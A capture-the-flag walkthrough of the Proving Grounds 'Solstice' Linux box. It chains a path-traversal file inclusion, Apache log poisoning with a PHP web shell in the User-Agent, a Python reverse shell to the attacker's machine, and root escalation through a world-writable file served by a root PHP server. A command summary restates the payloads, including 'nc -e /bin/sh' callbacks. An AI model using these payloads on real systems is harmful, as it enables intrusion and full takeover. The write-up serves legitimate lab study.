# Solstice - Proving Grounds Practice

> **Kill Chain Summary**: Multi-port Reconnaissance -> LFI Discovery on Port 8593 (/index.php?book=) -> Cross-Service Apache Log Poisoning via Port 80 User-Agent (/var/log/apache2/access.log) -> Reverse Shell as www-data -> Internal Process Enumeration (ps aux) reveals Root-run PHP Server on Port 57 -> Overwriting World-Writable Document Root (/var/tmp/sv/index.php) -> Root Shell.

| Property | Value |
|---|---|
| **Target Name** | Solstice |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux (Debian) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Multi-Port Enumeration, Local File Inclusion (LFI), Cross-Service Apache Log Poisoning, Process Enumeration, Local PHP Server Exploitation |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We run a full TCP port scan against the target:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp $IP
```

**Open Ports Summary:**

| Port | Service | Version | Description and Attack Surface |
|---|---|---|---|
| **21/tcp** | FTP | pyftpdlib 1.5.6 | Anonymous access denied |
| **22/tcp** | SSH | OpenSSH 7.9p1 | Standard administrative shell |
| **25/tcp** | SMTP | Exim smtpd | User enumeration (VRFY) returned no valid users |
| **80/tcp** | HTTP | Apache httpd 2.4.38 | Main web service: Target for log poisoning |
| **2121/tcp** | FTP | pyftpdlib 1.5.6 | Anonymous access allowed (pub owned by www-data, read-only) |
| **3128/tcp** | HTTP Proxy | Squid 4.6 | Proxy service (No misconfiguration found) |
| **8593/tcp** | HTTP | PHP CLI Server 7.3.14 | Secondary web application: Vulnerable to LFI |
| **54787/tcp** | HTTP | PHP CLI Server 7.3.14 | Secondary PHP service |
| **62524/tcp** | FTP | FreeFloat ftpd 1.00 | Legacy banner |

With 9 open ports, the key attack vector relies on correlating Port 80 (Apache writes access logs) with Port 8593 (PHP CLI application has an LFI vulnerability that can read those logs).

---

### 1.2 Web Enumeration

#### Port 80 (Apache)
Fuzzing directories on port 80:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt
```

Found endpoints `/app` and `/backup` returning HTTP 403 Forbidden. The server runs phpIPAM 1.4:

![[Pasted image 20260605213451.png]]

#### Port 8593 (PHP CLI Web Application) - LFI Discovery
Navigating to `http://$IP:8593/` reveals a "Book List" interface:

![[Pasted image 20260605222401.png]]

Clicking on a book reveals that content is dynamically fetched using a `book` query parameter:

![[Pasted image 20260605222942.png]]

Testing for Directory Traversal:

```text
http://$IP:8593/index.php?book=../../../../etc/passwd
```

![[Pasted image 20260605233907.png]]

The contents of `/etc/passwd` are rendered directly into the HTML body, confirming LFI.

---

## 2. Initial Access

### 2.1 Cross-Service Apache Log Poisoning

The application on port 8593 can read local system files. Standard Apache web servers log incoming HTTP requests to `/var/log/apache2/access.log`. By sending PHP code in the `User-Agent` header to port 80, Apache logs the payload. Then, requesting `/var/log/apache2/access.log` through the LFI on port 8593 causes the PHP engine to parse and execute our code.

#### Testing Log Readability
Verify that the Apache access log is readable by `www-data`:

```text
http://$IP:8593/index.php?book=../../../../../var/log/apache2/access.log
```

The log file loads cleanly.

#### Injecting PHP via User-Agent (Burp Suite)

Attempting to inject code via `curl -A "<?php system($_GET['cmd']); ?>"` can fail in Bash or Zsh because `$_GET` is interpreted as an unquoted shell variable (`zsh: bad math expression`). Using Burp Suite Repeater ensures the raw string is sent unmodified.

Send a request to port 80 with the PHP web shell payload in the `User-Agent` header:

```http
GET / HTTP/1.1
Host: 192.168.x.x
User-Agent: <?php system($_GET['cmd']); ?>
Connection: close
```

#### Triggering RCE via LFI
Execute system commands by including the access log and supplying the `cmd` parameter:

```text
http://$IP:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=whoami
```

![[Pasted image 20260606124120.png]]

The command output confirms code execution as `www-data`.

---

### 2.2 Upgrading to an Interactive Reverse Shell

Standard Bash one-liners failed due to URL encoding conflicts. We deploy a Python reverse shell one-liner:

1. Setup listener on Kali:
   ```bash
   sudo nc -lvnp 80
   ```

2. Send the URL-encoded Python payload via the `cmd` parameter:
   ```text
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
   ```

![[Pasted image 20260606130720.png]]

A reverse shell connects back to our listener:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking user flag:
```bash
cat /var/www/local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Internal Process Enumeration

Standard privilege escalation vectors (SUID binaries, `/etc/sudoers`, crontabs) yielded no exploitable configurations.

Inspecting running processes (`ps aux`) specifically for web and scripting engines reveals an anomaly:

```bash
ps aux | grep "php"
```

```text
www-data   474  /bin/sh -c /usr/bin/php -S 0.0.0.0:8593 -t /var/tmp/webserver/
root       475  /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
www-data   476  /bin/sh -c /usr/bin/php -S 0.0.0.0:54787 -t /var/tmp/webserver_2/
```

PID `475` is a PHP built-in web server listening locally on `127.0.0.1:57`, running with **root** privileges and serving files from `/var/tmp/sv/`.

---

### 3.2 Exploiting World-Writable Document Root

Checking permissions of the files inside `/var/tmp/sv/`:

```bash
ls -la /var/tmp/sv/
# -rwxrwxrwx 1 root root 36 Jun 19 2020 index.php
```

The served file `index.php` is world-writable (`777` permissions).

We overwrite `index.php` with a reverse shell payload targeting port 4444:

```bash
echo "<?php system('nc -e /bin/sh KALI_IP 4444'); ?>" > /var/tmp/sv/index.php
```

### 3.3 Triggering the Root Payload

1. Start a netcat listener on Kali:
   ```bash
   sudo nc -lvnp 4444
   ```

2. Trigger the local root PHP server from the target shell:
   ```bash
   curl http://127.0.0.1:57/
   ```

The listener catches the elevated shell:

```bash
connect to [KALI_IP] from [192.168.x.x]
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)
```

Checking root flag:
```bash
cat /root/proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Apache Log Poisoning Payload (User-Agent header via Burp Suite)
User-Agent: <?php system($_GET['cmd']); ?>

# LFI Log Reader with Command Execution
http://[TARGET_IP]:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=id

# Python Reverse Shell (Reliable for web execution)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[KALI_IP]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'

# PrivEsc via Local Root-run PHP Server
echo "<?php system('nc -e /bin/sh [KALI_IP] [PORT]'); ?>" > /var/tmp/sv/index.php && curl http://127.0.0.1:57/
```

---

## 5. Key Takeaways and Lessons Learned

1. **Cross-Service Exploitation:** Log poisoning is a multi-step attack chain: (1) Write code into a log via Service A, (2) Read and execute the log via an LFI in Service B. Do not assume log poisoning must happen exclusively within the service hosting the LFI.
2. **Burp vs Shell Escaping:** When injecting PHP code containing variables like `$_GET` or `$_POST`, terminal utilities (`curl`) can inadvertently expand them. Use Burp Suite Repeater to maintain byte-level control.
3. **Payload Resilience:** If Bash reverse shells fail due to special character parsing or URL encoding, fallback to Python or base64-encoded strings.
4. **Beyond SUID and Sudo:** When standard LinPEAS vectors are dry, inspect running root processes (`ps aux`). Any service running as root that executes, reads, or serves files from writable directories (`/tmp`, `/var/tmp`, `/opt`) represents a viable privilege escalation vector.

---

### Tags
#linux #lfi #path-traversal #log-poisoning #cross-service #php #privesc #process-hijack #easy #pg-practice #rooted
